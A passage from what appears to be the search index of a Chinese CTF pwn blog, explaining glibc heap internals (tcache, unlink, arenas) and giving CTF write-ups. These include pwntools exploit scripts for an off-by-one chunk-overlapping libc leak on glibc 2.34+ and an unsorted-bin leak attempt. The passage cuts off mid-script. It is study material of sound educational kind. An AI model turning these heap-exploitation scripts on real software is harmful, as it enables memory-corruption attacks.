might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock && old != NULL) old_idx = fastbin_index(chunksize(old)); p->fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock && old != NULL && __builtin_expect (old_idx != idx, 0)) { errstr = \\\"invalid fastbin entry (free)\\\"; goto errout; } \"]},\"340\":{\"h\":\"Tcache利用\",\"t\":[\"大多数性质和fastbin是一样的 但是calloc是不会拿tcache的 所以我们一般把tcache填满来绕过\"]},\"341\":{\"h\":\"NTUSTISC-PWN3阅读笔记（1）\",\"t\":[\"主要是看NTUSTISC\"]},\"342\":{\"h\":\"tcache dup\",\"t\":[\"tcache在libc2.31里面引用了key检查 然后在malloc的时候没有检查size 其次tcache的fd指向的是chunk data\",\"会在free进入tcache后在bk位置写入随机数 用于检查\",\"当检查一样时候 会for循环迭代tcache查看是否有指针和这个即将free的chunk的指针一样\",\"如果一样提示double free\",\"size_t tc_idx = csize2tidx (size); if (tcache != NULL && tc_idx < mp_.tcache_bins) { /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^<size_t> chance), so verify it's not an unlikely coincidence before aborting. */ // 这里就是检查bk是否等于tcache if (__glibc_unlikely (e->key == tcache)) { tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next) if (tmp == e) malloc_printerr (\\\"free(): double free detected in tcache 2\\\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ } if (tcache->counts[tc_idx] < mp_.tcache_count) { tcache_put (p, tc_idx); return; } } \"]},\"343\":{\"h\":\"UnsortedBin\",\"t\":[\"被free的chunk的上一块chunk是free chunk就合并\",\"如果下一块chunk是top chunk则合并到top chunk里面\",\"首个是main_arena然后双向链表\"]},\"344\":{\"h\":\"Consolidate\",\"t\":[\"unsortedBin在合并的时候 会使用unlink_chunk进行一个拖链操作\",\"首先获取p的size然后去找到下一个chunk 看下一个chunk的prev_size是否等于这个size\",\"通过p的fd获取上一个chunk bk获取下一个chunk\",\"FD = p->fd\",\"BK = p->bk\",\"然后FD->bk和BK->fd是否等于p\",\"然后BK->bk等于FD andFd->fd等于BK\",\"这样就完成了脱链操作\",\"static void unlink_chunk (mstate av, mchunkptr p) { if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); mchunkptr fd = p->fd; mchunkptr bk = p->bk; if (__builtin_expect (fd->bk != p || bk->fd != p, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); fd->bk = bk; bk->fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL) { if (p->fd_nextsize->bk_nextsize != p || p->bk_nextsize->fd_nextsize != p) malloc_printerr (\\\"corrupted double-linked list (not small)\\\"); if (fd->fd_nextsize == NULL) { if (p->fd_nextsize == p) fd->fd_nextsize = fd->bk_nextsize = fd; else { fd->fd_nextsize = p->fd_nextsize; fd->bk_nextsize = p->bk_nextsize; p->fd_nextsize->bk_nextsize = fd; p->bk_nextsize->fd_nextsize = fd; } } else { p->fd_nextsize->bk_nextsize = p->bk_nextsize; p->bk_nextsize->fd_nextsize = p->fd_nextsize; } } } \"]},\"345\":{\"h\":\"UnsafeUnlink + off_by_one\",\"t\":[\"这里主要是绕过unlink 来实现一个fake chunk的利用 主要运用在\",\"fakeUnlink\",\"当我们可以多写一个字节的时候我们可以构造一个fake chunk\",\"prev_size 0即可\",\"size payload的长度+1\",\"fd和bk\",\"这两个就比较重要了 因为要绕过unlink的安全检查 也就是检查FD->bk == p == BK->fd and p->size = nextchunk(p)->prev_size\",\"所以我们可以构造fd为ptr-0x18 那么FD->bk也就是FD+0X18的位置为p 绕过检查\",\"bk 同理设计为ptr-0x10\",\"next_chunk_prev_size 也就是下一个chunk的prev_size 这个构造等于payload的长度\",\"然后多的一个字节为0的话 我们就相当于chunk的p为0也就是我们构造的fake chunk会被当做free chunk而且这个free chunk的起始位置是根据prev_size来定的\",\"然后那么根据源码最终ptr会指向fd也就是ptr-0x18的位置\",\"这里的fd->bk和bk->fd都是p\",\" if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); mchunkptr fd = p->fd; mchunkptr bk = p->bk; if (__builtin_expect (fd->bk != p || bk->fd != p, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); fd->bk = bk; bk->fd = fd; \"]},\"346\":{\"h\":\"多线程pwn(ptmalloc)\",\"t\":[\"参考文章:ptmalloc堆概述-多线程支持_ptmalloc主arena存在的意义-CSDN博客\",\"推荐(讲得很清晰):ptmalloc源码分析 - 主分配区和非主分配区Arena的实现（04）_malloc main arena-CSDN博客\",\"ptmalloc源码分析 - 分配区状态机malloc_state（02）-CSDN博客\",\"ptmalloc源码分析 - 分配区heap_info结构实现（05）-CSDN博客\"]},\"347\":{\"h\":\"主分配区 和 非主分配区\",\"t\":[\"ptmalloc通过malloc_state结构体来管理内存的分配等一系列操作 我们可以看见我们相对熟悉的fastbinsY和bins也就是我们接触最多的fastbin,unsortedbin,smallbin,largebin等 这里我们主要观察next,next_free\",\"ptmalloc中用主分配区和非主分配区用来解决线程争夺问题\",\"非主分配区用mmap来映射获取内存\",\"主分配区和非主分配区用next形成一个环形链表进行管理 next链接的是非主分配区\",\"/* 分配区全局链表：分配区链表，主分配区放头部，新加入的分配区放main_arean.next 位置 Linked list */ struct malloc_state *next; \",\"/** * 全局malloc状态管理 */ struct malloc_state { /* Serialize access. 同步访问互斥锁 */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). * 用于标记当前主分配区的状态 * */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ /* 用于标记是否有fastchunk */ int have_fastchunks; /* Fastbins fast bins。 * fast bins是bins的高速缓冲区，大约有10个定长队列。 * 当用户释放一块不大于max_fast（默认值64）的chunk（一般小内存）的时候，会默认会被放到fast bins上。 * */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ /* Top chunk ：并不是所有的chunk都会被放到bins上。 * top chunk相当于分配区的顶部空闲内存，当bins上都不能满足内存分配要求的时候，就会来top chunk上分配。 */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above * 常规 bins chunk的链表数组 * 1. unsorted bin：是bins的一个缓冲区。当用户释放的内存大于max_fast或者fast bins合并后的chunk都会进入unsorted bin上 * 2. small bins和large bins。small bins和large bins是真正用来放置chunk双向链表的。每个bin之间相差8个字节，并且通过上面的这个列表， * 可以快速定位到合适大小的空闲chunk。 * 3. 下标1是unsorted bin，2到63是small bin，64到126是large bin，共126个bin * */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins * 表示bin数组当中某一个下标的bin是否为空，用来在分配的时候加速 * */ unsigned int binmap[BINMAPSIZE]; /* 分配区全局链表：分配区链表，主分配区放头部，新加入的分配区放main_arean.next 位置 Linked list */ struct malloc_state *next; /* 分配区空闲链表 Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ // 空闲链表的状态记录，0-空闲，n-正在使用中，关联的线程个数（一个分配区可以给多个线程使用） INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; \"]},\"348\":{\"h\":\"多线程分配\",\"t\":[\"malloc/arena.c/_int_new_arena函数中\"]},\"349\":{\"h\":\"流程\",\"t\":[\"线程中malloc 会检查线程中是否存在分配区，如果存在直接加锁，并且进行内存分配\",\"否则通过next遍历链表查看有未加锁分配区 然后加锁分配\",\"如果无的话 会ptamlloc一个新的分配区 加入malloc_state->next 然后加锁进行分配\",\"下方是malloc一个新的分区的情况\",\"__libc_lock_init (a->mutex); __libc_lock_lock (list_lock); /* Add the new arena to the global list. */ a->next = main_arena.next; /* FIXME: The barrier is an attempt to synchronize with read access in reused_arena, which does not acquire list_lock while traversing the list. */ atomic_write_barrier (); main_arena.next = a; __libc_lock_unlock (list_lock); __libc_lock_lock (free_list_lock); detach_arena (replaced_arena); __libc_lock_unlock (free_list_lock); \"]},\"350\":{\"h\":\"调用链:\",\"t\":[\"__libc_malloc-> arena_get arena_get2-> _int_new_arena \",\"先调用arena_get失败则调用arena_get2然后arena_get2中如果分配没有满则调用_int_new_arena满了调用reused_arena\"]},\"351\":{\"h\":\"arena_get\",\"t\":[\"调用主要是__libc_malloc函数中\",\"从thread_arena中获取分配区 如果成功则加锁 没有成功则通过arena_get2进行分配区的申请与初始化\",\"每个线程都会设置这么一个变量thread_arena 该变量保存对应的分配区。如果是主线程，则thread_arena设置成main_arena。\",\"main_arena是在ptamlloc_init的时候初始化的 主线程对应主分配区\",\"#define arena_get(ptr, size) do { \\\\ ptr = thread_arena; \\\\ arena_lock (ptr, size); \\\\ } while (0) static mstate arena_get_retry (mstate ar_ptr, size_t bytes) { LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr); if (ar_ptr != &main_arena) { __libc_lock_unlock (ar_ptr->mutex); ar_ptr = &main_arena; __libc_lock_lock (ar_ptr->mutex); } else { __libc_lock_unlock (ar_ptr->mutex); ar_ptr = arena_get2 (bytes, ar_ptr); } return ar_ptr; } \",\"image-20240506184605509\"]},\"352\":{\"h\":\"arena_get2\",\"t\":[\"这里出现的arena数量的上限 64位数量是8*cores+1 32位是2*cores+1\",\" static mstate arena_get2 (size_t size, mstate avoid_arena) { mstate a; static size_t narenas_limit; // 从空闲链表中获取一个分配区，如果空闲链表中有该分配区，则直接使用，返回结果 a = get_free_list (); // 获取失败的情况 if (a == NULL) { /* Nothing immediately available, so generate a new arena. */ if (narenas_limit == 0) { if (mp_.arena_max != 0) narenas_limit = mp_.arena_max; else if (narenas > mp_.arena_test) { int n = __get_nprocs_sched (); if (n >= 1) narenas_limit = NARENAS_FROM_NCORES (n); else /* We have no information about the system. Assume two cores. */ narenas_limit = NARENAS_FROM_NCORES (2); } } repeat:; size_t n = narenas; /* NB: the following depends on the fact that (size_t)0 - 1 is a very large number and that the underflow is OK. If arena_max is set the value of arena_test is irrelevant. If arena_test is set but narenas is not yet larger or equal to arena_test narenas_limit is 0. There is no possibility for narenas to be too big for the test to always fail since there is not enough address space to create that many arenas. */ if (__glibc_unlikely (n <= narenas_limit - 1)) { if (catomic_compare_and_exchange_bool_acq (&narenas, n + 1, n)) goto repeat; a = _int_new_arena (size); if (__glibc_unlikely (a == NULL)) catomic_decrement (&narenas); } else // 如果 a = reused_arena (avoid_arena); } return a; } \"]},\"353\":{\"h\":\"_int_new_arena (new arena)\",\"t\":[\"创建一个非主分配区\",\"/** * 初始化一个新的分配区arena * 该函数主要创建：非主分配区 * 主分配区在ptmalloc_init中初始化，并且设置了全局变量main_arena的值 */ static mstate _int_new_arena(size_t size) { mstate a; heap_info *h; char *ptr; unsigned long misalign; /* 分配一个heap_info，用于记录堆的信息，非主分配区一般都是通过MMAP向系统申请内存；非主分配区申请后，是不能被销毁的 */ // new_heap是仅仅在非主分配区使用的 h = new_heap(size + (sizeof(*h) + sizeof(*a) + MALLOC_ALIGNMENT), mp_.top_pad);å if (!h) { /* Maybe size is too large to fit in a single heap. So, just try to create a minimally-sized arena and let _int_malloc() attempt to deal with the large request via mmap_chunk(). */ h = new_heap(sizeof(*h) + sizeof(*a) + MALLOC_ALIGNMENT, mp_.top_pad); if (!h) return 0; } a = h->ar_ptr = (mstate)(h + 1); //heap_info->ar_ptr的值设置成mstate的分配区状态机的数据结构 malloc_init_state(a); //初始化mstate a->attached_threads = 1; //设置进程关联个数 /*a->next = NULL;*/ a->system_mem = a->max_system_mem = h->size; /* Set up the top chunk, with proper alignment. */ ptr = (char *) (a + 1); misalign = (unsigned long) chunk2mem(ptr) & MALLOC_ALIGN_MASK; if (misalign > 0) ptr += MALLOC_ALIGNMENT - misalign; top (a) = (mchunkptr) ptr; set_head(top(a), (((char *) h + h->size) - ptr) | PREV_INUSE); LIBC_PROBE(memory_arena_new, 2, a, size); mstate replaced_arena = thread_arena; thread_arena = a; //将当前线程设置mstate __libc_lock_init(a->mutex); //初始化分配区锁 __libc_lock_lock(list_lock); //加上分配区锁 /* 将新的分配区加入到全局链表上，新申请的分配区都会放入主分配区的下一个位置*/ /* Add the new arena to the global list. */ a->next = main_arena.next; /* FIXME: The barrier is an attempt to synchronize with read access in reused_arena, which does not acquire list_lock while traversing the list. */ atomic_write_barrier(); main_arena.next = a; __libc_lock_unlock(list_lock); /* 调整attached_threads状态*/ __libc_lock_lock(free_list_lock); detach_arena(replaced_arena); __libc_lock_unlock(free_list_lock); __malloc_fork_lock_parent. */ __libc_lock_lock(a->mutex); //解除分配区锁 return a; } /* Remove the arena from the free list (if it is present). free_list_lock must have been acquired by the caller. 移动链表地址，移除free_list上的分配区结构*/ static void remove_from_free_list(mstate arena) { mstate *previous = &free_list; for (mstate p = free_list; p != NULL; p = p->next_free) { assert(p->attached_threads == 0); if (p == arena) { /* Remove the requested arena from the list. */ *previous = p->next_free; break; } else previous = &p->next_free; } } \"]},\"354\":{\"h\":\"reused_arena\",\"t\":[\"简单来说就是遍历整个分配区表判断是否有锁 没锁就能用 这样就可以实现循环利用\"]},\"355\":{\"h\":\"记一次失败的UnsoretedBin 泄露libc（2024hgameWeek3 [1]）\",\"t\":[\"什么都pwn只会害了你\",\"2024 hgame的week3的一道题 libc版本2.27 虽然这个思路失败了 但是觉得还是学了东西 就记录下来\"]},\"356\":{\"h\":\"题目\",\"t\":[\"main函数\",\"​ \",\"add函数\",\"add\",\"delete函数\",\"delete\",\"show函数\",\"show\"]},\"357\":{\"h\":\"原理\",\"t\":[\"首先libc版本为2.27 引入了tcache并且没有引入bk随机数安全检查机制\",\"tcache bin的范围为:0x20-0x420\",\"tcache bin单个区间大小的链表长度最长为7个\",\"然后根据add函数的逻辑 我们一次性只能new一个0xff大小的chunk 显然不足以超过tcache bin的大小 所以我们得先填充满tcache\",\"unsorted bin是一个双向链表\",\"unsorted bin中第一个chunk的bk和最后一个chunk的fd都指向main_arena+48（32位）或main_arena+88（64位）的位置\",\"所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了main_arena+88的位置\",\"我们先把unsorted bin大小的chunk申请下来 然后再free 让fd和bk填充进去 然后malloc要回来\"]},\"358\":{\"h\":\"实践\",\"t\":[\"from pwn import * # r = process(\\\"./vuln\\\") r = gdb.debug(\\\"./vuln\\\",\\\"b *main+33\\\") class FakeChunk: def __init__(self): self.prev_size = p64(0) self.size = p64(0) self.fd = p64(0) self.bk = p64(0) self.payload = b\\\"\\\" self.next_chunk_prev_size = p64(0) def get_chunk_str(self): chunk = b\\\"\\\" chunk += self.prev_size chunk += self.size chunk += self.fd chunk += self.bk chunk += self.payload return chunk # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置 def set_chunk(self,size,ptr): self.prev_size = p64(0) self.size = p64(size +1) self.fd = p64(ptr-0x18) self.bk = p64(ptr-0x10) self.next_chunk_prev_size = p64(size) self.payload = (size - 32)*b\\\"a\\\" + self.next_chunk_prev_size print(f\\\"构造的chunk:\\\\n\\\\tprev_size:0\\\\n\\\\tsize:{ size }\\\\n\\\\tfd:{ hex(size +1) }\\\\n\\\\tbk:{ hex(ptr-0x10) }\\\\n\\\\tpatload长度:{ len(self.payload) }\\\\n\\\\t总长度:{ len(self.get_chunk_str()) }\\\") def waite_menu(): print(r.recvuntil(b\\\"Your choice:\\\")) def show(index): waite_menu() r.sendline(b\\\"2\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) def delete(index): waite_menu() r.sendline(b\\\"3\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(f\\\"------------------\\\\n删除index为{ index }的chunk\\\\n------------------\\\") def add(index,size,content): waite_menu() r.sendline(b\\\"1\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(r.recvuntil(b\\\"Size: \\\")) r.sendline(str(size)) print(r.recvuntil(b\\\"Content: \\\")) r.send(content) print(f\\\"------------------\\\\n添加index为{ index }的chunk\\\\n------------------\\\") # fake_chunk = FakeChunk() # fake_chunk.set_chunk(size=0xa8,) for i in range(10): print(\\\"i :\\\",i) add(i,0xa0,b\\\"\\\\x00\\\") for i in range(8): print(\\\"i :\\\",i) delete(i) for i in range(8): print(\\\"i :\\\",i) add(i, 0xa0, b\\\"\\\\x00\\\") r.interactive() \",\"先malloc 10个chunk(大于8个就行)\",\"因为如果unsorted bin的chunk和top chunk相邻会被直接合并 所以我们需要一个alloced chunk挡在top chunk前\",\"然后free 8个chunk 让tcache bin的位置填满 然后malloc 8个 让tcache bin先被消耗掉\",\"因为当tcache chunk有大小合适的 chunk的时候 优先取 tcache chunk然后再去寻找unsorted bin\",\"然后我发现一个状况 就是新获得unsroted bin中的chunk fd和bk都被清空了\",\"empty\",\"并且通过测试发现只要是刚好要malloc的chunk大小如何符合 这个unsortedbin的chunk的大小就会被清空\",\"所以尝试其他思路\"]},\"359\":{\"h\":\"修改思路\",\"t\":[\"from pwn import * # r = process(\\\"./vuln\\\") r = gdb.debug(\\\"./vuln\\\",\\\"b *main+33\\\") class FakeChunk: def __init__(self): self.prev_size = p64(0) self.size = p64(0) self.fd = p64(0) self.bk = p64(0) self.payload = b\\\"\\\" self.next_chunk_prev_size = p64(0) def get_chunk_str(self): chunk = b\\\"\\\" chunk += self.prev_size chunk += self.size chunk += self.fd chunk += self.bk chunk += self.payload return chunk # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置 def set_chunk(self,size,ptr): self.prev_size = p64(0) self.size = p64(size +1) self.fd = p64(ptr-0x18) self.bk = p64(ptr-0x10) self.next_chunk_prev_size = p64(size) self.payload = (size - 32)*b\\\"a\\\" + self.next_chunk_prev_size print(f\\\"构造的chunk:\\\\n\\\\tprev_size:0\\\\n\\\\tsize:{ size }\\\\n\\\\tfd:{ hex(size +1) }\\\\n\\\\tbk:{ hex(ptr-0x10) }\\\\n\\\\tpatload长度:{ len(self.payload) }\\\\n\\\\t总长度:{ len(self.get_chunk_str()) }\\\") def waite_menu(): print(r.recvuntil(b\\\"Your choice:\\\")) def show(index): waite_menu() r.sendline(b\\\"2\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) def delete(index): waite_menu() r.sendline(b\\\"3\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(f\\\"------------------\\\\n删除index为{ index }的chunk\\\\n------------------\\\") def add(index,size,content): waite_menu() r.sendline(b\\\"1\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(r.recvuntil(b\\\"Size: \\\")) r.sendline(str(size)) print(r.recvuntil(b\\\"Content: \\\")) r.send(content) print(f\\\"------------------\\\\n添加index为{ index }的chunk\\\\n------------------\\\") # fake_chunk = FakeChunk() # fake_chunk.set_chunk(size=0xa8,) for i in range(10): print(\\\"i :\\\",i) add(i,0xa0,b\\\"\\\\x00\\\") for i in range(8): print(\\\"i :\\\",i) delete(i) add(0,0x90,b\\\"\\\\x00\\\") r.interactive() \",\"然后修改思路 最后的malloc变为malloc一个更小的chunk 这样机制会优先去寻找unsortedbin来切割出一个更小的chunk\"]},\"360\":{\"h\":\"结果\",\"t\":[\"最终让fd和bk写上了main_arean+88的地址了 但是我忽略了 在写入内容的时候最后加了一个0导致我们没办法读出来 内容被阶段了 (悲)\"]},\"361\":{\"h\":\"vctf apples leak libc操作复现(高版本的overlapping)\",\"t\":[\"题目中存在off_by_one libc版本2.34以上我们没办法使用常规的overlapping 泄露libc地址\",\"所以我们要精心构造一个chunk head来绕过新版本的检查机制 实现leak libc的操作\",\"文章中我们先讲原理 在最后会将Arahat0师傅的脚本给出来()\"]},\"362\":{\"h\":\"安全检查机制\",\"t\":[\"2.34下的合并检查机制\",\"检查size是否对得上\",\"image-20240325110240440\",\"unlink检查\",\"image-20240325110339049\"]},\"363\":{\"h\":\"利用原理\",\"t\":[\"这里先简单说一下我们要干什么\",\"后面详细说一下我们的利用流程\",\"构造一个chunkheader 让它的size fd bk都符合检查机制\"]},\"364\":{\"h\":\"利用\"},\"365\":{\"h\":\"构造chunk header\",\"t\":[\"主要是构造合法的size fd bk 我们把我们构造的chunk叫做fake chunk\",\"代码\",\"add(0x410, \\\"a\\\" * 8) # 0 290 add(0x100, \\\"a\\\" * 8) # 1 6b0 add(0x430, \\\"a\\\" * 8) # 2 7c0 add(0x430, \\\"a\\\" * 8) # 3 c00 add(0x100, \\\"a\\\" * 8) # 4 1040 add(0x480, \\\"a\\\" * 8) # 5 1150 add(0x420, \\\"a\\\" * 8) # 6 15e0 add(0x10, \\\"a\\\" * 8) # 7 1a10 free(0) free(3) free(6) # 触发合并 然后合成一个0x860的大chunk 让我们可以分割 # 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk free(2) # add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方 # 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头 add(0x450, b\\\"a\\\" * 0x438 + p16(0x551)) # 0 # 将 chunk3 变为allocted add(0x410, \\\"a\\\" * 8) # 2 add(0x420, \\\"a\\\" * 8) # 3 add(0x410, \\\"a\\\" * 8) # 6 \",\"free 3个chunk(chunk0 chunk3 chunk6) 这样chunk3(的fd和bk分别指向chunk 0 chunk6\",\"这里需要特殊说明 这里的chunk3的地址要特殊一些 也就是最低的地址为00 这样方便我们后面使用off_by_one漏洞来实现修改fd/bk的低地址为0来让FD->bk BK->fd 指向我们伪造的chunk (后面会详细说明)\",\"free 一个chunk 让两个chunk(chunk3 与chun2)合并 这样就保留了fd(chunk 0)和bk(chunk6)在一个大的chunk中\",\"然后我们将这个大chunk分割为chunk3 和chunk4 让我们自己构造的size刚好覆盖在原chunk3 size 位置 详细看下方图\",\"image-20240325111430446\",\"分割大chunk 并且构造size\",\"image-20240325111521964\",\"​\",\"这里我们已经成功构造好了 size和fd bk 那么后面我们就要想办法让chunk 0的bk 和chunk6的fd指向我们构造的chunk\"]},\"366\":{\"h\":\"构造FD->bk\",\"t\":[\"这里主要是利用先让chunk0的bk 指向chunk3 然后利用off_by_one漏洞覆写bk 指向我们的fake chunk\",\"代码\",\"# 覆写chunk0的fd free(6) #free的chunk 3 free(2) #free的chunk 0 add(0x410, \\\"a\\\" * 8) # 2 add(0x410, \\\"a\\\" * 8) # 6 \",\"示意图\",\"image-20240325114920279\"]},\"367\":{\"h\":\"构造BK->fd\",\"t\":[\"这里就要复杂一点了 因为修改chunk 6 的fd不能像修改FD->bk那样直接free 然后add\",\"我们需要利用 合并机制来修改 也就是先free chunk3 chunk 6 以及chunk5 触发chunk6和chunk5合并\",\"然后我们分割一个chunk 5出来 并且向原本chunk6 size fd位置赋值\",\"代码\",\"free(6) free(3) free(5) add(0x4f0, b\\\"b\\\" * 0x488 + p64(0x431)) # 3 add(0x3b0, \\\"a\\\" * 8) # 5 \",\"示意图\",\"image-20240325115900055\",\"add后\",\"image-20240325135125545\"]},\"368\":{\"h\":\"构造合并chunk\",\"t\":[\"这里就要简单很多了 就是利用一次合并机制和分割机制 造成prev_inuse变为0 并且构造好prev_size\",\"只不过我们还是得调整一下要选择合并的chunk的位置 因为我们刚才构造的fake chunk大小为0x550所以我们要在fake chunk往下0x550位置弄出一个 allocted chunk\",\"下面的解释其实有失偏颇 因为其实是我们专门计算的0x550这个数据 刚好对上一个chunk 但是为了方便理解我们选择倒推的方式\",\"代码\",\"free(4) add(0x108, b\\\"c\\\" * 0x100 + p64(0x550)) # 4 add(0x400, \\\"a\\\" * 8) # 6 free(3) add(0x10, \\\"a\\\" * 8) # 3 show(6) \",\"首先我们看一下 fakechunk 0x550偏移位置坐标在哪里\",\"image-20240325145741621\",\"image-20240325145825097\",\"根据地址我们知道 也就是我们要修改的chunk为chunk 5 那么我们就去free掉chunk 4(大小0x110)然后malloc回来 写入数据覆盖到chunk 5的prev_inuse 并且构造好0x550的prev_size\",\"示意图\",\"image-20240325150321671\",\"此时我们成功完成构造 最后只需要 free掉chunk 5触发合并机制 然后我们成功完成一次overlapping 可喜可贺\"]},\"369\":{\"h\":\"脚本\",\"t\":[\"from pwn import * # from pwncli import * # context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'sp', '-h'] context(os='linux', arch='amd64') local = 1 elf = ELF('./vuln') if local: p = gdb.debug('./vuln',\\\"b *main+57\\\") libc = ELF('./libc.so') else: p = remote('', 0) libc = ELF('./libc.so') sd = lambda s: p.send(s) sl = lambda s: p.sendline(s) sa = lambda n, s: p.sendafter(n, s) sla = lambda n, s: p.sendlineafter(n, s) rc = lambda n: p.recv(n) rl = lambda: p.recvline() ru = lambda s: p.recvuntil(s) ra = lambda: p.recvall() ia = lambda: p.interactive() uu32 = lambda data: u32(data.ljust(4, b\\\"\\\\x00\\\")) uu64 = lambda data: u64(data.ljust(8, b\\\"\\\\x00\\\")) def cmd(op): sla(\\\">> \\\", str(op)) def add(size, content): cmd(1) sla(\\\"How many students do you want to add: \\\", str(1)) sla(\\\"Gender (m/f): \\\", \\\"m\\\") sla(\\\"Size: \\\", str(size)) sa(\\\"Content:\\\", content) print(\\\"--------------\\\\nadd一个\\\\n--------------\\\") def show(index): # gender,content,size cmd(2) sla(\\\"Enter the index of the student: \\\", str(index)) cmd(2) print(\\\"--------------\\\\nshow一个\\\\n--------------\\\") def free(index): # gender,content,size cmd(3) sla(\\\"Enter the index of the student: \\\", str(index)) cmd(2) print(\\\"--------------\\\\n删除一个\\\\n--------------\\\") add(0x410, \\\"a\\\" * 8) # 0 290 add(0x100, \\\"a\\\" * 8) # 1 6b0 add(0x430, \\\"a\\\" * 8) # 2 7c0 add(0x430, \\\"a\\\" * 8) # 3 c00 add(0x100, \\\"a\\\" * 8) # 4 1040 add(0x480, \\\"a\\\" * 8) # 5 1150 add(0x420, \\\"a\\\" * 8) # 6 15e0 add(0x10, \\\"a\\\" * 8) # 7 1a10 free(0) free(3) free(6) # 触发合并 然后合成一个0x860的大chunk 让我们可以分割 # 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk free(2) # add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方 # 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头 add(0x450, b\\\"a\\\" * 0x438 + p16(0x551)) # 0 # 将 chunk3 变为allocted add(0x410, \\\"a\\\" * 8) # 2 add(0x420, \\\"a\\\" * 8) # 3 add(0x410, \\\"a\\\" * 8) # 6 print(\\\"构造fake chunk成功\\\") free(6) free(2) add(0x410, \\\"a\\\" * 8) # 2 add(0x410, \\\"a\\\" * 8) # 6 print(\\\"构造FD->bk成功\\\") free(6) free(3) free(5) add(0x4f0, b\\\"b\\\" * 0x488 + p64(0x431)) # 3 add(0x3b0, \\\"a\\\" * 8) # 5 print(\\\"构造BK->fd成功\\\") free(4) add(0x108, b\\\"c\\\" * 0x100 + p64(0x550)) # 4 add(0x400, \\\"a\\\" * 8) # 6 free(3) add(0x10, \\\"a\\\" * 8) # 3 show(6) \"]},\"370\":{\"h\":\"xyctf ptmp的做题记录(glibc2.35下的exit函数打法)\"},\"371\":{\"h\":\"审题\",\"t\":[\"add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc\",\"image-20240418005442527\",\"delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空\",\"image-20240418005502800\",\"view函数 直接write出size大小的内容 存在泄露\",\"image-20240418005523801\",\"atexit函数\",\"image-20240418131700409\"]},\"372\":{\"h\":\"大致利用原理:\",\"t\":[\"这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调\",\"泄露libc heap地址\",\"通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址\",\"伪造fake chunk（消耗topchunk触发fastbin的合并）\",\"或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin\",\"因为题目中存在isUsed 有了这个就阻止了我们double free所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double free\",\"劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表\",\"大概思路:exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)\",\"[原创] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式\"]},\"373\":{\"h\":\"泄露libc heap\",\"t\":[\"最简单的一步\",\"简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址\",\"for i in range(9): add(i,128,b\\\"a\\\"*0x18) for i in range(9): delete(i) # 泄露出chunk add(0,0x68,b\\\"a\\\"*8) res = view(0) base_heap = 